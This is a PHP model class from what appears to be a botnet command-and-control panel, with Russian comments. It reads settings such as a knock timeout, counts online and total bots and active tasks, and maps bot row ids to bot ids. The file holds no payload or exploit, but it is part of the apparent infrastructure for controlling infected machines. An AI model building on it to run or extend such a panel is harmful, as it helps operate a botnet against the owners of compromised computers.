<?php

class Model
{
    private $pdo;
	private $dbh;
	protected $request_data;

	protected function getDB() {
	    if (isset($this->dbh) && !empty($this->dbh))
	        return $this->dbh;
	    else {
            $this->pdo = new PDO(DATABASE_SOURCE_NAME, DATABASE_USER_NAME, DATABASE_USER_PASSWORD);
            $this->dbh = new Db($this->pdo);
            return $this->dbh;
        }
    }

	// метод выборки данных
	public function get_data()
	{
		// todo
	}

	public function getSettings() {
        //$knock = $this->getDB()->queryValue("SELECT knock FROM settings");
        $lifetime = $this->getDB()->queryValue("SELECT setting_value FROM general_settings WHERE setting_name = 'lifetime'");
        $knock = $this->getDB()->queryValue("SELECT setting_value FROM general_settings WHERE setting_name = 'knock_timeout'");
        $o_sql = $this->getDB()->queryValue('SELECT COUNT(*) FROM bots WHERE last_login + :on > UNIX_TIMESTAMP()',
            array(':on' => $knock * 60));
        $online_bots = number_format($o_sql);
        $total_bots = $this->getDB()->queryValue('SELECT COUNT(*) FROM bots');
        $active_tasks = $this->getDB()->queryValue('SELECT COUNT(*) FROM main_tasks WHERE status = ' . TaskStatus::Active);
        return array('knock' => $knock, 'online_bots' => $online_bots, 'total_bots' => !empty($total_bots) ? $total_bots : 0, 'active_tasks' => $active_tasks, 'lifetime' => $lifetime);
    }

    public function getBotIdByRowId($botRowId = null)
    {
        $botid = $this->getDB()->getValue('bots', 'botid', 'id=:bot_id', array(':bot_id' => !empty($botRowId) ? $botRowId : $this->request_data['bot_id']));
        if (!empty($botid))
        {
            return $botid;
        }
        return null;
    }

    public function getRowIdByBotId($botId = null)
    {
        $bot_id = $this->getDB()->getValue('bots', 'id', 'botid=:botid', array(':botid' => !empty($botId) ? $botId : $this->request_data['botid']));
        if (!empty($bot_id))
        {
            return $bot_id;
        }
        return null;
    }

	public function setRequestData(&$data) {
	    $this->request_data = $data;
    }
}